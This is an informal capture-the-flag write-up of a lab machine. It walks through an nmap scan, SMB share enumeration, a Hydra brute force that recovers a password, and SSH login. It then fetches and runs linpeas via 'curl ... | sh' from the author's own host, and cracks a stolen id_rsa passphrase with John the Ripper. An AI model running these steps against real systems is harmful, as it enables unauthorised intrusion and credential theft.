# Basic Pentesting

- In these set of tasks you'll learn the following:

    1. brute forcing 
    2. hash cracking 
    3. service enumeration
    4. Linux Enumeration
    

```
export IP=10.10.27.13
```

- I deployed the machine and then and then i wielded my magic wand like grand wizard.(did nmap scan...LOL!). Man all the servers running on the ports are foreign to me. Like i have to go research every single one of them.

- Lots of services run on the machine but the one that locked eyes with me is the smb shares running on the machine. Lemme just connect and see how it goes. This is the first time I am dealing with smb shares.
Looking around the interwebz for something to exploit on the smb share i found this wonderful command 
```
nmap -sV --script=smb-enum-shares -p445 $IP

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

- I did the directory scans and found some directory `/development` with some coversations in it. It gives some clues about insecure passwords or something like that.
So now its only left with what i'm going to do. Something tells me i have to do some password bruteforce or something close to that.
I connected to the smb share on the machine and then looked around, i found some other message meant for all the users of the shares. I got the message and got the username of the users on the server.

- I am having touble using hydra, I dont even know how it works in the first place.
i found the password for one of the users using hydra bruteforcing tool and the password is `armando`


- I sshed into the system, spun a simple `python2 -m SimpleHTTPServer 9999` in the directory i have `linpeas.sh` at. Went into the remote server and executed `curl <my-ip-addr>:<port>/linpeas.sh | sh`
This shit run smoothly and run linpeas on the server. Man, i have the id_rsa of the other user too. Bingo lets go and escalate this MF!. but first lemme go google how to copy text in a tmux session.

- okay the id_rsa file has a passpharase or something creepy prevent me from using it hahaha :).
JohnTheRipper to the rescue. LOL! 

-  I was having troubles using johntheripper on my laptop so i installed kali on my bros laptop and here i am :).

- The password is `beeswax`. Kali is good man. LOL!
